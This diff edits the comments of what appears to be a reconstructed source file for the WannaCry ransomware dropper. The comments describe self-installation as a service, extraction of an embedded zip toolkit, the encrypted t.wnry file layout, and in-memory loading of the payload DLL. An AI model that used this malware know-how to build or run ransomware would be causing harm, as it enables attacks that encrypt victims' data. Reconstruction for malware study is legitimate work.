@@ -1,7 +1,8 @@
-// dropper.cpp — WannaCry.exe, the 2017 WannaCry dropper/installer: copies
-// itself to tasksche.exe and registers it as a service, unpacks its toolkit
-// from an embedded zip resource, then decrypts t.wnry in-memory with the
-// embedded RSA key and runs the payload DLL's TaskStart entry.
+// dropper.cpp — the WannaCry dropper/installer (WannaCry.exe)
+// Copies itself to tasksche.exe as a service, unpacks its embedded toolkit
+// zip, then decrypts t.wnry in-memory and runs the payload core's TaskStart
+// entry.
+// Reconstructed from the 2017 WannaCry binary (educational).
 
 #include <windows.h>
 #include <stdio.h>
@@ -81,12 +82,6 @@ typedef BOOL (WINAPI *CRYPTIMPORT_FN)(HCRYPTPROV, BYTE *, DWORD, HCRYPTKEY,
 typedef BOOL (WINAPI *CRYPTDESTROY_FN)(HCRYPTKEY);
 typedef BOOL (WINAPI *CRYPTDECRYPT_FN)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD,
                                        BYTE *, DWORD *);
-
-// ---------------------------------------------------------------------------
-// Pass-through callbacks handed to the in-memory PE loader: VirtualAlloc,
-// VirtualFree, LoadLibraryA, GetProcAddress, FreeLibrary — so the loader
-// itself needs no imports of its own.
-// ---------------------------------------------------------------------------
 
 // ---------------------------------------------------------------------------
 // ResolveAdvapi32 — LoadLibraryA("advapi32.dll"), then GetProcAddress for the
@@ -290,7 +285,7 @@ static int AES_SetKey(AES *a, const BYTE *key, const BYTE *ivPtr,
 
 // AES_ProcessData — transform len bytes (must be a multiple of the block
 // size): mode 1 = CBC-decrypt, mode 2 = CBC-encrypt, anything else = ECB.
-// Mode 1 is the loop that turns t.wnry's ciphertext into the payload DLL:
+// Mode 1 is the loop that turns t.wnry's ciphertext into the payload core:
 // decrypt block, XOR with the chain, then fold the ciphertext block into the
 // chain for the next round.
 static void AES_ProcessData(AES *a, BYTE *buf, BYTE *out, DWORD len, int mode)
@@ -339,14 +334,14 @@ int  Container_Init(CryptoContainer *c, LPCSTR keyFile,
 // decompiler artifact — the assembly zeroes both fully).
 // Container_Init — import the key into sessionA (file-based mode additionally
 // imports into sessionB), allocate the two 1 MiB buffers, store the params.
-// WinMain always calls Init(0,0,0): embedded-key mode only. */
+// WinMain always calls Init(0,0,0): embedded-key mode only.
 
 // ---------------------------------------------------------------------------
 // Container_ReadTwnry — read and decrypt t.wnry. File layout (byte offsets):
 //   "WANACRY!" magic (8 B) | u32 0x100 @0x8 (RSA blob length) |
 //   256-B RSA-wrapped AES key @0xC | u32 unused @0x10C |
 //   u64 payload size @0x110 | AES-128-CBC (NULL IV) ciphertext of the
-//   payload DLL from @0x118 to EOF
+//   payload core from @0x118 to EOF
 // ---------------------------------------------------------------------------
 static BYTE *Container_ReadTwnry(CryptoContainer *c, LPCSTR path,
                                  UINT *outSize)
@@ -401,8 +396,9 @@ fail:
 }
 
 // ---------------------------------------------------------------------------
-// In-memory PE loader — maps the decrypted t.wnry payload (a DLL) into this
-// process without touching the filesystem, then runs its entry point.
+// In-memory PE loader — maps the decrypted payload core (the t.wnry DLL)
+// into this process without touching the filesystem, then runs its entry
+// point.
 // ---------------------------------------------------------------------------
 typedef struct {                    // 0x3C-byte HeapAlloc'd loader state
     DWORD peHdrRva;                 // [0] e_lfanew of the mapped image
@@ -714,7 +710,7 @@ static BOOL SelectWorkdir(wchar_t *outPath /*unused here, passed 0*/)
 // (g_randName); its ImagePath wraps the exe in `cmd.exe /c "..."`. If the
 // service already exists (prior infection), just start it.
 // NOTE: the service name is the RANDOM name — "mssecsvc2.0" belongs to the
-// worm component, not this dropper.
+// network worm component, not this dropper.
 // ---------------------------------------------------------------------------
 static int ServiceInstall(LPCSTR fullPath)
 {
@@ -781,7 +777,7 @@ static int InstallAndLaunch(void)
 
 // ---------------------------------------------------------------------------
 // ExtractResource — pull the embedded zip toolkit out of the executable's
-// resources (resource #2058, type "XIA"), open it as an in-memory archive
+// resources (resource ID 2058, type "XIA"), open it as an in-memory archive
 // with the password, and extract every entry except a c.wnry that already
 // exists (preserving the victim's config).
 // ---------------------------------------------------------------------------
@@ -846,7 +842,7 @@ static HMODULE MemLoad_DLL(BYTE *dll, DWORD size)
 //                 + start it as a service, wait for the payload mutex.
 //   otherwise (run): stage the toolkit (extract zip, randomize BTC address,
 //                 hide + open the workdir), then decrypt t.wnry in-memory
-//                 and call the payload DLL's TaskStart export. This is the
+//                 and call the payload core's TaskStart export. This is the
 //                 path the service's tasksche.exe execution lands in too.
 // ---------------------------------------------------------------------------
 int WINAPI WinMainCrt(HINSTANCE hInstance, HINSTANCE hPrev,
